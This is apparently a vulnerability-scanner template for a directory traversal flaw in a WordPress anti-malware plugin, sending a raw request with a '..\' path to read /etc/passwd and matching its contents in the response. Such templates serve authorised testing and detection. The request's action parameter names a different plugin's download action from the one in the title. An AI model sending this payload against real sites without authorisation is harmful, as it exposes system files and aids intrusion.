id: gotmls-plugin-lfi

info:
  name: WordPress Plugin Anti-Malware Security and Bruteforce Firewall 4.20.59 - Directory Traversal
  author: vsh00t,daffainfo
  severity: high
  reference: https://www.exploit-db.com/exploits/50107
  tags: wordpress,wp-plugin,lfi,gotmls

requests:
  - raw:
      - |+
        GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
